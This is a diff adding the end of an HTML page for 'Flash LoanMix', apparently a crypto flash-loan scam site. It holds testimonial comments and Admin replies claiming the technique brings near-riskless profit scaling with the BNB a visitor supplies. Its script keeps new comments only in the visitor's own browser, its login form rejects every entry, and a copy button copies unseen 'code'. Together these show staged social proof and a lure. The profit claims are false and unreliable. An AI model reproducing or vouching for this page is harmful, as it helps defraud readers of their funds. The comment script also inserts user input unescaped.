+<div class="comment-content">That is right, you will not get a significant loss because the flash loan is done very quickly and within 1 second it will be withdrawn back to the wallet balance. So that if you experience a loss, you will not feel it.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar40.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Ido Hag</h6>
+<span>02 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">Tutorial is very helpful</div>
+</div>
+</div>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar41.html" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Jurriaan Prakken</h6>
+<span>03 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">Is it available for SOLANA?</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</a></h6>
+<span>03 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">For now, it is only available on the BNB and ETH networks, but we will test it to find out on the SOL network. Keep waiting on our platform, don't miss it dude.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar42.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Louwrens Smink</h6>
+<span>04 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">Can you get a loss with this flash loan technique??</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</a></h6>
+<span>04 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">I will briefly explain how flash loans work, you buy a pair on a smart chain network and before the purchase transaction is closed you will sell the pair. So that profit is obtained when in 1 second it increases and will be sold in the next second, the possibility of loss will not be large, but it all depends on the BNB capital you provide, the more BNB, the more loan amount you will get.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar43.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Twan Eilders</h6>
+<span>05 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">I did not expect anyone to give this technique for free, but it's really cool... thank you</div>
+</div>
+</div>
+</li>
+</ul>
+<ul id="new_comment" class="comments-list"></ul>
+</div>
+</div>
+<div class="alert alert-danger d-none" role="alert" id="alert_comment"></div>
+<div class="comment container col-xxl-7 col-xl-8 col-lg-9 col-md-10 col-sm-8">
+<h3 class="h3">Add a comment</h3>
+<div class="form-floatin my-3"> <label for="name">Name</label> <input id="name" type="text" class="form-control paste-content" placeholder="Your Name"></div>
+<div class="form-floatin my-3"> <label for="email">Email address</label> <input id="email" type="email" class="form-control paste-content" placeholder="name@example.com"></div>
+<div class="form-floating"><textarea class="form-control paste-content" placeholder="Leave a comment here" id="comment_text" style="height: 100px"></textarea><label for="comment_text">Type Something</label></div>
+<a id="add_comment" class="com-btn btn btn-bd-download mt-3">Submit</a>
+</div>
+</div>
+</div>
+<div class="py-3" style="clear:both"></div>
+<footer class="bd-footer p-2 bg-dark text-center">
+<p>Copyright &copy; <script>document.write(new Date().getFullYear())</script> Flash LoanMix All Rights Reserved</p>
+</footer>
+</body>
+<script>
+if (localStorage.comment) {
+	$('#new_comment').html(localStorage.comment);
+}
+
+function alert_comment(text) {
+	$('#alert_comment').text(text);
+	$('#alert_comment').removeClass("d-none");
+	setTimeout(function () {
+		$('#alert_comment').addClass("d-none");
+	}, 5000);
+}
+
+function alert_login(text) {
+	$('#alert_login').text(text);
+	$('#alert_login').removeClass("d-none");
+	setTimeout(function () {
+		$('#alert_login').addClass("d-none");
+	}, 5000);
+}
+
+function code_copy() {
+  var copyText = document.getElementById("code-copy");
+  copyText.select();
+  copyText.setSelectionRange(0, 99999)
+  document.execCommand("copy");
+  alert("Code Copied.");
+}
+
+function validateEmail(email) {
+	var regex = /^([a-zA-Z0-9_.+-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
+	return regex.test(email);
+}
+jQuery(document).ready(function () {
+	$('#add_comment').on('click', function () {
+		let name = $('#name').val();
+		let email = $('#email').val();
+		let comment_text = $('#comment_text').val();
+		var d = new Date();
+		const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+		var month = monthNames[d.getMonth()];
+		var day = d.getDate();
+		var output = day + ' ' + (('' + month).length < 2 ? '0' : '') + month + ' ' + (('' + day).length < 2 ? '0' : '') + d.getFullYear();
+		if (name == "") {
+			alert_comment("The name field has not been filled.");
+		}
+		if (email == "") {
+			alert_comment("The email field has not been filled.");
+		}
+		if (comment_text == "") {
+			alert_comment("The text field has not been filled.");
+		}
+		if (name != "" && email != "" && comment_text != "") {
+			if (!validateEmail(email)) {
+				alert_comment("Email format is incorrect.");
+			} else {
+				$("#new_comment").append(`<li><div class="comment-main-level"><div class="comment-avatar"><img src="./avatar/avatar1.webp" alt=""></div><div class="comment-box"><div class="comment-head"><h6 class="comment-name">` + name + `</h6><span>` + output + `</span><i class="fa fa-reply"></i><i class="fa fa-heart"></i></div><div class="comment-content">` + comment_text + `</div></div></div></li>`);
+				localStorage.comment = $('#new_comment').html();
+			}
+		}
+	});
+	$('#login_submit').on('click', function () {
+		let email = $('#email_login').val();
+		let password = $('#password_login').val();
+		if (password == "") {
+			alert_login("The password field has not been filled.");
+		}
+		if (email == "") {
+			alert_login("The email field has not been filled.");
+		}
+		if (password != "" && email != "") {
+			if (!validateEmail(email)) {
+				alert_login("Email format is incorrect.");
+			} else {
+				alert_login("The email and password you enter is not associated with any account.");
+			}
+		}
+	});
+});</script>
+
+<script type="text/javascript">
+var sc_project=12542022; 
+var sc_invisible=1; 
+var sc_security="51c3570b"; 
+</script>
+<script type="text/javascript" src="statcounter/counter/counter.js" async></script>
+<noscript><div class="statcounter"><a title="free web stats"
+href="https://statcounter.com/" target="_blank"><img
+class="statcounter"
+src="https://c.statcounter.com/12542022/0/51c3570b/1/"
+alt="free web stats"></a></div></noscript>
+
+
+</html>
